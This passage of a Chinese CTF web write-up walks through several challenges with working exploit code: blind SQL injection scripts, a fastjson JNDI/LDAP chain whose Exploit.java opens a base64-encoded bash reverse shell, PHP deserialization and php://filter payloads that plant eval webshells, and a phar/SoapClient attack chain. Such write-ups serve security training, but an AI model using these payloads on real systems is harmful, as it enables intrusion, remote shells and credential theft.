+        p1="admin'/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),{},1))={},1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#".format(i,mid)
+        p2="admin'/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),{},1))>{},1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#".format(i,mid)
+        data1={'username':'admin','password':p1}
+        data2={'username':'admin','password':p2}
+        try:
+            print(i,mid)
+            r1=requests.post(url,data=data1,timeout=1)
+        except requests.exceptions.ReadTimeout as e:
+            flag+=chr(mid)
+            print(flag)
+            break
+        except Exception as e:
+            pass
+        else:
+            try:
+                r2=requests.post(url,data=data2,timeout=1)
+            except requests.exceptions.ReadTimeout as e:
+                low=mid+1
+            except Exception as e:
+                pass
+            else:
+                top=mid-1
+    if flag==f1:
+        break
+# user
+# id,username,password
+# no_0ne_kn0w_th1s
+```
+
+
+
+登入之后是一个图像选择页面，测试了下发现图像接口存在目录穿越，读pom.xml
+
+> ../../../../../pom.xml
+
+![](https://img.npfs06.top/20210317192251.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+刚好是有漏洞的版本 
+
+参考连接：https://www.redhatzone.com/ask/article/2914.html
+
+工具下载链接：https://github.com/CaijiOrz/fastjson-1.2.47-RCE
+
+
+
+基本上照着参考链接做就能成功得到flag
+
+我们要做的就是 `http -> ldap -> exploit.class ->反弹shell`
+
+**第一步**
+
+将下载的工具放在同一目录下
+
+![](https://img.npfs06.top/20210317193249.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+可以发现多了一个Exploit.calss文件，这是需要自己本地`javac Exploit.java`生成的
+
+Exploit.java修改如下
+
+```
+public class Exploit {
+    public Exploit(){
+        try{
+            Runtime.getRuntime().exec( "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4eC54eHgueHh4Lnh4eC83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}");  //这里就是一个反弹shell的命令，填的是服务器ip和监听端口
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] argv){
+        Exploit e = new Exploit();
+    }
+}
+
+```
+
+修改后，生成Exploit.class
+
+**第二步**
+
+开启HTTP服务
+
+
+
+![](https://img.npfs06.top/20210317193832.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+注意：这里是要在利用文件所在目录下开启http服务
+
+这一步的作用就是启动http服务器，提供下载远程要调用的类
+
+![](https://img.npfs06.top/20210317195120.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+可以成功访问
+
+
+
+**第三步**
+
+开启ldap服务
+
+同理，在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP
+
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IP/#Exploit
+```
+
+
+
+![](https://img.npfs06.top/20210317194047.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+这里红框圈起来的地方需要注意一下，9999是自定义的ldap开启端口，不设置的话默认是1389，不过我在复现的时候发现，如果不指定端口的话，无法成功引用exploit文件
+
+
+
+**第四步**
+
+开启监听
+
+![](https://img.npfs06.top/20210317194321.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+**第五步**
+
+getshell
+
+通过测试，发现正常的json语句被过滤，需要进行编码转换，前几天p神的知识星球刚好有讲到
+
+![](https://img.npfs06.top/20210317195940.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+这里用unicode编码绕过
+
+![](https://img.npfs06.top/20210317194617.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+```
+roleJson={"name":{"\u0040\u0074\u0079\u0070\u0065":"java.lang.Class","val":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","dataSourceName":"ldap://xxx.xxx.xxx.xxx:9999/Exploit","\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074":true}}}
+```
+
+
+
+成功监听，
+
+![](https://img.npfs06.top/20210317194640.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+## [FBCTF2019]Products Manager
+
+知识点：sql约束攻击
+
+通过测试发现可以通过`add`添加产品信息，通过`view`查看产品信息
+
+审计代码
+
+![](https://img.npfs06.top/20210318230747.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+其中给出了提示，flag在`facebook`中，但若想查询产品细节，需要产品的`Secret`值
+
+ ### 数据库字符串比较
+
+**在处理SQL中的字符串时，字符串末尾的空格字符都会被删除。换句话说，“cat”与“cat      ”几乎是等效的，这在大多数情况下是正确的，例如WHERE子句中的字符串或INSERT语句中的字符串。例如，以下语句的查询结果，与使用用户名“cat”进行查询时的结果是一样的。**
+
+![](https://img.npfs06.top/20210318231001.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+但是，除此之外也确实存在例外情况，例如LIKE子句。注意，对尾部空白字符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。
+
+### INSERT截断
+
+ **在任意INSERT查询中，SQL会根据varchar(n)来限制字符串的最大长度，也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。例如，如果特定列的长度约束为“5”个字符，那么在插入字符串“facebook”时，实际上只能插入字符串的前5个字符，即“faceb”。**
+
+![](https://img.npfs06.top/20210318231504.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+查看view.php:
+
+```
+if (isset($name) && $name !== ""
+        && isset($secret) && $secret !== "") {
+    if (check_name_secret($name, hash('sha256', $secret)) === false) {
+      return "Incorrect name or secret, please try again";
+    }
+    $product = get_product($name);
+    echo "<p>Product details:";
+    echo "<ul><li>" . htmlentities($product['name']) . "</li>";
+    echo "<li>" . htmlentities($product['description']) . "</li></ul></p>";
+```
+
+跟进到/db.php::check_name_secret，源码如下：
+
+```
+function check_name_secret($name, $secret) {
+  global $db;
+  $valid = false;
+  $statement = $db->prepare(
+    "SELECT name FROM products WHERE name = ? AND secret = ?"
+  );
+  check_errors($statement);
+  $statement->bind_param("ss", $name, $secret);
+  check_errors($statement->execute());
+  $res = $statement->get_result();
+  check_errors($res);
+  if ($res->fetch_assoc() !== null) {
+    $valid = true;
+  }
+  $statement->close();
+  return $valid;
+}
+```
+
+>    "SELECT name FROM products WHERE name = ? AND secret = ?"
+
+没有做什么过滤
+
+
+
+/db.php::get_product源码如下：
+
+```
+function get_product($name) {
+  global $db;
+  $statement = $db->prepare(
+    "SELECT name, description FROM products WHERE name = ?"
+  );
+  check_errors($statement);
+  $statement->bind_param("s", $name);
+  check_errors($statement->execute());
+  $res = $statement->get_result();
+  check_errors($res);
+  $product = $res->fetch_assoc();
+  $statement->close();
+  return $product;
+}
+```
+
+check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点
+
+
+于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag
+
+
+
+
+
+## 梦里花开牡丹亭
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+//include('shell.php');
+class Game{
+    public  $username= 'admin';
+    public  $password = 'admin';
+    public  $register = "admin";
+
+    public  $file = new Open ($this->filename,$this->content);
+    public  $filename = "php://filter/convert.base64-encode/resource=shell";
+    public  $content ;
+
+    public function __construct()
+    {
+        $this->file= new Open($this->filename,$this->content);
+    }
+
+}
+
+class Open{
+    function open($filename, $content){
+        if(!file_get_contents('waf.txt')){
+            print($content);
+        }else{
+            echo file_get_contents($filename.".php");
+        }
+    }
+}
+$a = new Game();
+print (base64_encode(serialize($a)));
+//@unserialize(base64_decode($_POST['unser']));
+
+```
+
+![](https://img.npfs06.top/20210322183621.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+```php
+<?php
+function shell($cmd){
+    if(strlen($cmd)<10){
+        if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/',$cmd)){
+            die("NO");
+        }else{
+            return system($cmd);
+        }
+    }else{
+        die('so long!'); 
+    }
+}��"
+```
+
+去php文档里面找了之后发现有个ZipArchive内置类，里面有个open方法，可以删除文件
+
+![](https://img.npfs06.top/20210322184916.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+![](https://img.npfs06.top/20210322184939.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+```php
+<?php
+
+class Game{
+    public  $username;
+    public  $password;
+    public  $choice;
+    public  $register;
+
+    public  $file;
+    public  $filename;
+    public  $content;
+
+    public function __construct() {
+        $this->username = "admin";
+        $this->password = "admin";
+        $this->register = "admin";
+        $this->file = new ZipArchive();
+        $this->filename = "waf.txt";
+        $this->content = ZipArchive::OVERWRITE;
+    }
+
+    public function __wakeup() {
+        if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3") {
+            $this->choice=new login($this->file,$this->filename,$this->content);
+        }else{
+            $this->choice = new register();
+        }
+    }
+}
+
+class apen{
+    function open($filename, $content){
+        if(!file_get_contents('waf.txt')){
+            shell($content);
+        }else{
+            echo file_get_contents($filename.".php");
+        }
+    }
+}
+
+$game = new Game();
+$game = serialize($game);
+print(base64_encode($game));
+```
+
+
+
+![](https://img.npfs06.top/20210322183659.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+waf.txt文件被删除，我们在尝试读取下shell.php文件，可以发现是读取失败的，因为这个时候，`if`语句一直为真了
+
+![](https://img.npfs06.top/20210322183823.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+构造命令即可,因为`nl`被过滤了，我们可以用斜杠分隔
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+//include('shell.php');
+class Game{
+    public  $username= 'admin';
+    public  $password = 'admin';
+    public  $register = "admin";
+
+    public  $file ;
+    public  $filename ;
+    public  $content = "n\l /flag" ;
+
+    public function __construct()
+    {
+        $this->file= new Open($this->filename,$this->content);
+    }
+
+}
+
+class Open{
+    function open($filename, $content){
+        if(!file_get_contents('waf.txt')){
+            print($content);
+        }else{
+            echo file_get_contents($filename.".php");
+        }
+    }
+}
+$a = new Game();
+print (base64_encode(serialize($a)));
+//@unserialize(base64_decode($_POST['unser']));
+
+```
+
+payload:
+
+```
+Tzo0OiJHYW1lIjo2OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtzOjk6Im5cbCAvZmxhZyI7fQ==
+```
+
+
+
+## [网鼎杯 2020 朱雀组]Think Java
+
+下载下来class文件，jd-gui反编译
+
+![](https://img.npfs06.top/20210324222013.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+`/common/test`和`/sqlDct`这两个路由都是可以直接访问的
+
+我们跟进到`sqlDict`路由的`getTableData`函数
+
+![](https://img.npfs06.top/20210324222340.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+根据dbName传入值。然后创建数据库连接。并且带入sql执行。很明显，`dbName`可控，存在sql注入
+
+jdbc类似URL解析。所以当我们输入`myapp#' union select 1#`时
+`#`在URL中是锚点，没有实际意义
+
+```
+jdbc:mysql://mysqldbserver:3306/myapp#' union select 1#
+会被解析成
+jdbc:mysql://mysqldbserver:3306/myapp
+
+再带入sql语句
+Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '#' union select 1#' and table_name='" + TableName + "'
+第一个#被单引号包裹。成了普通的#字符。第二个#注释掉了后面的语句。造成sql注入
+```
+
+所以我们可以这样构造
+
+![](https://img.npfs06.top/20210324223039.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+得到password
+
+通过信息收集我们发现了这么个东西：
+
+![](https://img.npfs06.top/20210324223213.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+百度搜索一波，发现spring boot存在这么个页面：`swagger-ui.html`我们访问下，有三个路由
+
+![](https://img.npfs06.top/20210324224141.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+在/common/user/login接口，用我们刚刚得到的账号密码登入，得到一串token
+
+>下方的特征可以作为序列化的标志参考:
+>
+>一段数据以**rO0AB**开头，你基本可以确定这串就是JAVA序列化base64加密的数据。
+>
+>或者如果以**aced**开头，那么他就是这一段java序列化的16进制。
+
+明显为java反序列化
+
+![](https://img.npfs06.top/20210324224333.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+我们可以用工具SerializationDumper来解析数据
+
+用法:
+
+```
+ java -jar SerializationDumper-[*version*].jar [*16进制数据*)]
+```
+
+这里不详细写了，重点是找到反序列话注入点
+
+尝试把序列化的token字段作为Authorization去印证这个UI的/common/user/current接口。显示成功登录。
+
+![](https://img.npfs06.top/20210324224910.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+直接用yso生成payload
+
+![](https://img.npfs06.top/20210324221829.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+![](https://img.npfs06.top/20210324225143.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+监听端口，把生成文件里的token替换掉原token，即可得到flag
+
+
+
+
+
+## PyCalX 1&2
+
+就是个计算器
+
+![](https://img.npfs06.top/20210324235635.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+直接给了源码
+
+```python
+#!/usr/bin/env python3
+import cgi;
+import sys
+from html import escape
+
+FLAG = open('/var/www/flag','r').read()
+
+OK_200 =  
+
+print(OK_200)
+arguments = cgi.FieldStorage()
+
+if 'source' in arguments:
+    source = arguments['source'].value
+else:
+    source = 0
+
+if source == '1':
+    print('<pre>'+escape(str(open(__file__,'r').read()))+'</pre>')
+
+if 'value1' in arguments and 'value2' in arguments and 'op' in arguments:
+
+    def get_value(val):
+        val = str(val)[:64]
+        if str(val).isdigit(): return int(val)
+        blacklist = ['(',')','[',']','\'','"'] # I don't like tuple, list and dict.
+        if val == '' or [c for c in blacklist if c in val] != []:
+            print('<center>Invalid value</center>')
+            sys.exit(0)
+        return val
+
+    def get_op(val):
+        val = str(val)[:2]
+        list_ops = ['+','-','/','*','=','!']
+        if val == '' or val[0] not in list_ops:
+            print('<center>Invalid op</center>')
+            sys.exit(0)
+        return val
+
+    op = get_op(arguments['op'].value)
+    value1 = get_value(arguments['value1'].value)
+    value2 = get_value(arguments['value2'].value)
+
+    if str(value1).isdigit() ^ str(value2).isdigit():
+        print('<center>Types of the values don\'t match</center>')
+        sys.exit(0)
+
+    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
+
+    print('<div class=container><div class=row><div class=col-md-2></div><div class="col-md-8"><pre>')
+    print('>>>> print('+escape(calc_eval)+')')
+
+    try:
+        result = str(eval(calc_eval))
+        if result.isdigit() or result == 'True' or result == 'False':
+            print(result)
+        else:
+            print("Invalid") # Sorry we don't support output as a string due to security issue.
+    except:
+        print("Invalid")
+
+
+    print('>>> </pre></div></div></div>')
+```
+
+value1+op+value2
+value1和2不能出现`"()[]\`
+op的第一个字符只能是`+-/*=!`
+
+最后是通过`calc_eval = str(repr(value1)) + str(op) + str(repr(value2))`拼接
+
+而repr() 函数是将对象转化为供解释器读取的，看下面的例子
+
+![](https://img.npfs06.top/20210325000340.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+ repr在转化字符串时会默认套上单引号，而由于op是没过滤单引号，所以可以导致val2逃逸 
+
+最初的执行是这样的
+
+```
+'1'  +  '1'
+```
+
+但由于op只判断第一个值。我们可以插入单引号。并且注释后面的单引号
+
+```
+'1'  +'  ' and source in flag#
+```
+
+可以看到。我们op输入+'。成功闭合语句。然后在value2的地方构造语句并注释，返回类型为True或False，构造布尔盲注
+
+```python
+import requests
+import string
+str=string.printable
+flag='flag{'
+url='http://0a1bd9a5-ef79-49d0-8cda-cd4d937ff543.node3.buuoj.cn/cgi-bin/pycalx.py'
+while 1:
+    for i in str:
+        data = {
+            'value1': 'a',
+            'op': '+\'',
+            'value2': 'and 1 and source in FLAG#',
+            'source': flag+i
+        }
+        re = requests.get(url, params=data)
+        #print(re.text)
+        if 'True' in re.text:
+            flag+=i
+            print(flag)
+```
+
+
+
+
+
+## [WMCTF2020]Make PHP Great Again 2.0
+
+```php
+<?php
+highlight_file(__FILE__);
+require_once 'flag.php';
+if(isset($_GET['file'])) {
+  require_once $_GET['file'];
+}
+```
+
+payload1:
+
+<a href="http://npfs06.top/2020/10/10/%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a>
+
+
+
+payload2:
+
+`/proc/self`指向当前进程的`/proc/pid/`，`/proc/self/root/`是指向`/`的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过
+
+```
+php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+
+```
+
+原理可参考https://www.anquanke.com/post/id/213235
+
+
+
+## [WMCTF2020]Web Check in 2.0
+
+```php
+<?php
+//PHP 7.0.33 Apache/2.4.25
+error_reporting(0);
+$sandbox = '/var/www/html/sandbox/' . md5($_SERVER['REMOTE_ADDR']);
+@mkdir($sandbox);
+@chdir($sandbox);
+var_dump("Sandbox:".$sandbox);
+highlight_file(__FILE__);
+if(isset($_GET['content'])) {
+    $content = $_GET['content'];
+    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
+         die('hacker');
+    if(file_exists($content))
+        require_once($content);
+    file_put_contents($content,'<?php exit();'.$content);
+}
+```
+
+方法一：两次urldecode编码绕过
+
+通过查看伪协议处理的源码👇
+
+```php
+static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) /* {{{ */
+{
+	char *p, *token = NULL;
+	php_stream_filter *temp_filter;
+
+	p = php_strtok_r(filterlist, "|", &token);
+	while (p) {
+		php_url_decode(p, strlen(p));#👈对过滤器进行了一次urldecode
+		if (read_chain) {
+			if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
+				php_stream_filter_append(&stream->readfilters, temp_filter);
+			} else {
+				php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
+			}
+		}
+		if (write_chain) {
+			if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
+				php_stream_filter_append(&stream->writefilters, temp_filter);
+			} else {
+				php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
+			}
+		}
+		p = php_strtok_r(NULL, "|", &token);
+	}
+}
+```
+
+file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的 ，题目过滤了%25 ，很好绕过
+
+![](https://img.npfs06.top/20210326161153.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+```php
+<?php
+$char = 'r'; #构造r的二次编码
+for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
+	for ($ascii2 = 0; $ascii2 < 256; $ascii2++) {
+		$aaa = '%'.$ascii1.'%'.$ascii2;
+		if(urldecode(urldecode($aaa)) == $char){
+			echo $char.': '.$aaa;
+			echo "\n";
+		}
+	}
+}
+?>
+```
+
+
+
+payload:
+
+```
+?content=php://filter/write=string.%2572ot13|<?cuc @riny($_TRG[_]);?>/resource=npfs.php 
+
+?content=npfs.php&_=system("ls /"); 
+
+//注意每利用一次文件，就要重新包含一次
+```
+
+
+
+方法二：过滤器构造绕过
+
+题目中过滤的过滤器有👇
+
+```
+/iconv|UCS|UTF|rot|quoted|base64/
+```
+
+`php:filter`支持使用多个过滤器，参考官方文档 [可用过滤器列表](https://www.php.net/manual/zh/filters.php)，还留下了**字符串过滤器中的部分**和**压缩过滤器**以及**加密过滤器**，这里考虑用`zlib`的`zlib.deflate`和`zlib.inflate`，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit👇
+
+payload
+
+```
+?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=npfs.php
+
+?content=npfs.php&1=system('ls /');
+```
+
+
+
+
+
+## suctf2019-Upload-Labs-2
+
+首先是一个文件上传，有三点限制
+
+- 后缀只能是gif,jpeg,jpg,png
+- 检查了MIME类型，抓包改下即可
+- 文件内容不能出现<?，但是限制的很不严谨
+
+index.php
+
+![](https://img.npfs06.top/20210327160926.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+class.php
+
+![](https://img.npfs06.top/20210327160618.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+然后在func,php有一个查看上传文件类型的功能
+
+```php
+func.php
+
+<?php
+include 'class.php';
+
+if (isset($_POST["submit"]) && isset($_POST["url"])) {
+    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){
+        die("Go away!");
+    }else{
+        $file_path = $_POST['url'];
+        $file = new File($file_path);
+        $file->getMIME();
+        echo "<p>Your file type is '$file' </p>";
+    }
+}
+?>
+//主要就是限制了各种协议，然后实例化了File类，调用了getMIME()方法
+```
+
+跟进到File类和getMIME()方法看看
+
+```php
+class File{
+
+    public $file_name;
+    public $type;
+    public $func = "Check";
+
+    function __construct($file_name){
+        $this->file_name = $file_name;
+    }
+
+    function __wakeup(){
+        $class = new ReflectionClass($this->func);
+        $a = $class->newInstanceArgs($this->file_name);
+        $a->check();
+    }
+    
+    function getMIME(){
+        $finfo = finfo_open(FILEINFO_MIME_TYPE);
+        $this->type = finfo_file($finfo, $this->file_name);
+        finfo_close($finfo);
+    }
+
+    function __toString(){
+        return $this->type;
+    }
+
+}
+```
+
+finfo_file,看一看这个函数的c源码
+
+```c
+case FILEINFO_MODE_FILE:
+		{
+			/* determine if the file is a local file or remote URL */
+			const char *tmp2;
+			php_stream_wrapper *wrap;
+			php_stream_statbuf ssb;
+
+			if (buffer == NULL || !*buffer) {
+				php_error_docref(NULL, E_WARNING, "Empty filename or path");
+				RETVAL_FALSE;
+				goto clean;
+			}
+			if (CHECK_NULL_PATH(buffer, buffer_len)) {
+				php_error_docref(NULL, E_WARNING, "Invalid path");
+				RETVAL_FALSE;
+				goto clean;
+			}
+
+			wrap = php_stream_locate_url_wrapper(buffer, &tmp2, 0);
+```
+
+其中调用了php_stream_locate_url_wrapper这个函数
+在https://blog.zsxsoft.com/post/38 中讲了，使用了php_stream_locate_url_wrapper的php函数，都会存在phar反序列化的问题
+phar反序列化如何触发一个ssrf呢，这里可以利用到SoapClient的CRLF注入漏洞
+
+而后就是 admin.php 中令人异常疑惑的四段代码了：
+
+```php
+$reflect = new ReflectionClass($this->clazz);
+$this->instance = $reflect->newInstanceArgs();
+
+$reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);
+$reflectionMethod->invoke($this->instance, $this->arg1);
+
+$reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);
+$reflectionMethod->invoke($this->instance, $this->arg2);
+
+$reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
+$reflectionMethod->invoke($this->instance, $this->arg3);
+```
+
+ReflectionClass，是一个反射类，能将参数实例化
+
+而ReflectionClass::newInstanceArgs相当于用来赋值
+
+![](https://img.npfs06.top/20210327221043.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+有什么用呢？用`__wakeup`，需要想办法去触发反序列化。然而这四段代码其实正好对应了：
+
+```
+$m = new mysqli();
+$m->init();
+$m->real_connect('ip','select 1','select 1','select 1',3306);
+$m->query('select 1;');
+```
+
+其实也就是 @LoRexxar' 在 Tsec 上进行的分享 [Comprehensive analysis of the mysql client attack chain](https://paper.seebug.org/998/) 的内容了，@zsx 文章中指出
